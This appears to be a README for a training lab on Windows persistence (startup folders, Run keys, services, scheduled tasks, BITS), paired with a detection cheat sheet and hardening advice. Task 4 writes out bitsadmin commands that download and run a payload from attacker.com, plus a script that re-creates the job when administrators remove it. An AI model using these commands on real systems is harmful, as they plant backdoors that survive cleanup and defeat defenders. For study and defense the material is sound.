# **Access Persistence Techniques**

## **📌 Introduction**

Gaining initial access to a system is often fleeting; **persistence makes it permanent**. In the lifecycle of a cyber assessment, maintaining a foothold is critical for long-term operations, allowing operators to survive system reboots, user logoffs, and connection drops.  
This project delves into the mechanics of **Windows Access Persistence**, exploring how adversaries embed themselves deep within operating system features. By abusing native, trusted Windows mechanisms—such as Startup folders, Registry Run keys, Windows Services, Scheduled Tasks, and Background Intelligent Transfer Service (BITS) jobs—this repository documents how temporary footholds are converted into resilient, reboot-surviviable access paths.

## **🎯 Why It Matters**

In real-world red teaming and threat activity, initial entry vectors (e.g., phishing, memory corruption exploits) are inherently fragile. A simple machine restart or security updates patch cycle can sever an active shell instantly.  
Understanding how adversaries weaponize benign administrative features allows red teams to simulate realistic, stealthy backdoors and enables blue teams to construct robust hunting rules. By learning how to identify, analyze, and remove unauthorized persistence hooks, security professionals ensure that once an intrusion is identified, it is completely eradicated from the environment.

## **🧠 Learning Objectives**

By completing this module, the following Windows persistence mechanics, forensic indicators, and remediation strategies are mastered without external assistance:

* **Startup Artifact Abuse:** Locating and auditing user-specific and system-global Startup directories for unauthorized executables or shortcuts.  
* **Registry Execution Hooks:** Manipulating HKCU and HKLM Run / RunOnce registry hives to trigger payload execution upon user authentication.  
* **Service Management Exploitation:** Configuring background Windows Services to automatically execute malicious binaries under high-privilege system contexts (NT AUTHORITY\\SYSTEM).  
* **Task Automation Abuse:** Leveraging Windows Task Scheduler (schtasks) to execute payloads based on specific system triggers (boot, logon, or idle time).  
* **Covert Transfers via BITS:** Utilizing BITSAdmin and PowerShell BITS cmdlets to download payloads asynchronously in the background while evading network inspections.  
* **WMI Event Subscriptions:** Explaining how WMI \_\_EventFilter, \_\_EventConsumer, and \_\_FilterToConsumerBinding classes can be bound together for fileless persistence.  
* **System Hygiene & Remediation:** Cleaning up modified registry keys, rogue services, and scheduled tasks to restore target systems to a verified clean baseline.

## **🛠️ Lab Infrastructure & Credentials**

The operational testing environment uses a dedicated, isolated Windows virtual machine.

                         \[ Isolated Windows Target Asset \]  
                                         │  
        ┌────────────────────────────────┼────────────────────────────────┐  
        ▼                                ▼                                ▼  
┌──────────────┐                 ┌──────────────┐                 ┌──────────────┐  
│ Startup/Run  │                 │   Services   │                 │ BITS & Tasks │  
│ Persistence  │                 │  Backdoors   │                 │ Automation   │  
└──────────────┘                 └──────────────┘                 └──────────────┘

### **Environment Access Profile**

* **Target OS:** Windows Virtual Machine  
* **Student User Account:** Student / Password: Student  
* **SuperAdministrator Account:** SuperAdministrator / Password: Root@123  
* **Permitted Tooling:** PowerShell, Metasploit Framework, Cobalt Strike, Sysinternals Suite (Autoruns).

## **📂 Repository Layout**

holbertonschool-cyber\_security/  
└── persistence\_in\_windows/  
    └── 0x00\_acces\_persistence\_techniques/  
        ├── 0-flag.txt  
        ├── 1-flag.txt  
        ├── 2-flag.txt  
        ├── 3-flag.txt  
        ├── bits\_checker.ps1  
        ├── results.md  
        └── README.md

## **⚡ Attack Scenarios & Lab Implementations**

### **Task 0: Persistence via Startup Folder**

* **Mechanics:** The Windows Startup folder automatically launches any executable or shortcut (.lnk) contained within it upon user login.  
* **Locations Audited:**  
  * **User-Specific:** C:\\Users\\\<Username\>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup  
  * **System-Global (All Users):** C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup  
* **Execution Walkthrough:**  
  1. Inspect both user-specific and system-wide Startup folders for unauthorized scripts or executables:  
     PowerShell  
     Get-ChildItem \-Path "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"  
     Get-ChildItem \-Path "$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

  2. Locate the persistent artifact embedded in the folder, inspect its properties, and extract the flag string.  
* **Deliverable Path:** persistence\_in\_windows/0x00\_acces\_persistence\_techniques/0-flag.txt

### **Task 1: Persistence via Registry Autorun Keys**

* **Mechanics:** Modifying Windows Registry keys forces the system to execute targeted binary strings during logon initialization.  
* **Target Registry Hives:**  
  * HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  
  * HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  
* **Execution Walkthrough:**  
  1. Inspect the target registry run keys using regedit or PowerShell:  
     PowerShell  
     Get-ItemProperty \-Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  
     Get-ItemProperty \-Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

  2. Identify an auto-executing entry pointing to an encoded PowerShell script.  
  3. Extract and decode the base64-encoded string inside the payload to uncover the hidden flag.  
  4. **System Hygiene:** Remove the malicious registry entry and clear shell history to restore system state:  
     PowerShell  
     Remove-ItemProperty \-Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" \-Name "PersistentEntry"

* **Deliverable Path:** persistence\_in\_windows/0x00\_acces\_persistence\_techniques/1-flag.txt

### **Task 2: Persistence via Windows Services**

* **Mechanics:** Windows Services can be created or modified to start automatically on boot, executing background processes with elevated privileges without requiring an active user logon session.  
* **Execution Walkthrough:**  
  1. Enumerate target services using Get-Service or sc.exe:  
     PowerShell  
     Get-WmiObject \-Class Win32\_Service | Where-Object { $\_.Name \-like "\*flag\*" \-or $\_.DisplayName \-like "\*flag\*" }

  2. Inspect the metadata of the flag3 service to discover a hidden base64-encoded string embedded within its Description attribute.  
  3. Decode the base64 string to extract the secret key:  
     PowerShell  
     \[System.Text.Encoding\]::UTF8.GetString(\[System.Convert\]::FromBase64String("ENCODED\_STRING"))

  4. Perform post-lab cleanup by removing the unauthorized test service.  
* **Deliverable Path:** persistence\_in\_windows/0x00\_acces\_persistence\_techniques/2-flag.txt

### **Task 3: Persistence via Scheduled Tasks**

* **Mechanics:** The Windows Task Scheduler permits scheduling arbitrary command executions based on specific system triggers, such as system boot, logon, or periodic time intervals.  
* **Execution Walkthrough:**  
  1. Query active tasks via PowerShell or schtasks.exe:  
     PowerShell  
     Get-ScheduledTask | Where-Object { $\_.State \-ne "Disabled" }

  2. Locate the suspicious persistent task configured to launch at user logon.  
  3. Inspect the task properties and description metadata to recover the flag token.  
* **Deliverable Path:** persistence\_in\_windows/0x00\_acces\_persistence\_techniques/3-flag.txt

### **Task 4: Covert Persistence & Monitoring via BITSAdmin**

* **Mechanics:** Background Intelligent Transfer Service (BITS) is designed for asynchronous, throttled file downloads in the background. Attackers abuse BITS jobs to fetch remote payloads covertly, as transfers survive network disruptions and system reboots.  
* **Execution Walkthrough:**  
  1. Enumerate active BITS jobs across the system:  
     DOS  
     bitsadmin /list /allusers /verbose

  2. Create a persistent BITS download job:  
     DOS  
     bitsadmin /create PersistentJob  
     bitsadmin /addfile PersistentJob "http://attacker.com/payload.exe" "C:\\Users\\Public\\payload.exe"  
     bitsadmin /SetNotifyCmdLine PersistentJob "C:\\Users\\Public\\payload.exe" NULL  
     bitsadmin /resume PersistentJob

  3. Construct a PowerShell checker script (bits\_checker.ps1) to monitor the status of the job and automatically recreate it if removed by an administrator:  
     PowerShell  
     \# Monitoring script to ensure BITS persistence survival  
     $JobName \= "PersistentJob"  
     $BitsJob \= Get-BitsTransfer \-Name $JobName \-ErrorAction SilentlyContinue

     if (\-not $BitsJob) {  
         \# Re-create job if deleted by defensive sweeps  
         Start-BitsTransfer \-Source "http://attacker.com/payload.exe" \-Destination "C:\\Users\\Public\\payload.exe" \-Asynchronous \-DisplayName $JobName  
     }

* **Deliverable Path:** persistence\_in\_windows/0x00\_acces\_persistence\_techniques/bits\_checker.ps1

## **🔬 Forensic Detection & Event Correlation Cheat Sheet**

| Persistence Technique | Primary Windows Location / Artifact | Key Detection Event ID / Log Source |
| :---- | :---- | :---- |
| **Startup Folder** | %APPDATA%\\...\\Startup / %ProgramData%\\...\\Startup | Sysmon Event ID 11 (FileCreate) |
| **Registry Autorun** | HKLM / HKCU ...\\CurrentVersion\\Run | Sysmon Event ID 13 (RegistryValueSet) |
| **Windows Services** | HKLM\\SYSTEM\\CurrentControlSet\\Services | Event ID 7045 (A service was installed in the system) |
| **Scheduled Tasks** | C:\\Windows\\System32\\Tasks | Event ID 4698 (A scheduled task was created) |
| **BITS Admin Jobs** | Microsoft-Windows-BITS-Client/Operational | Event ID 3 (BITS Job Created) / Event ID 59 |

## **⚙️ Operational & Compliance Guidelines**

* **Secure Credential Management:** Hardcoded passphrases inside scripts are strictly prohibited. Operational scripts ingest credentials securely via process environment variables or interactive prompt bindings.  
* **Detailed Execution Logging:** stdout outputs, script execution traces, and flag verification steps must be cataloged inside results.md.  
* **POSIX Compliance Verification:** All plain text files, scripts, and flag submissions in this repository terminate with a trailing newline character (\\n) to preserve stream manipulation integrity.

## **🛡️ Defensive Hardening Matrix (Remediation Design)**

\[\!IMPORTANT\]

### **1\. Monitor Autoruns & Startup Locations**

Deploy automated security software (e.g., Sysinternals Autoruns) and establish baseline monitoring over registry keys (HKLM / HKCU \\Run) and Startup directories to detect unauthorized execution entries immediately.

### **2\. Restrict Service & Task Creation Privileges**

Apply strict Group Policy Objects (GPOs) ensuring non-administrative users cannot register new Windows Services, create high-privilege Scheduled Tasks, or alter system execution paths.

### **3\. Audit BITS Transfers & Event Logs**

Enable verbose event logging for Microsoft-Windows-BITS-Client/Operational. Continuously monitor for unexpected background file transfers or BITS jobs configured with notification command execution strings (SetNotifyCmdLine).

## **⚠️ Disclaimer**

\[\!WARNING\]  
This repository is maintained strictly for ethical hacking education, defensive engineering research, and authorized red-team lab testing. Executing persistence mechanisms or unauthorized command chains against production systems without explicit, prior written legal consent is strictly illegal.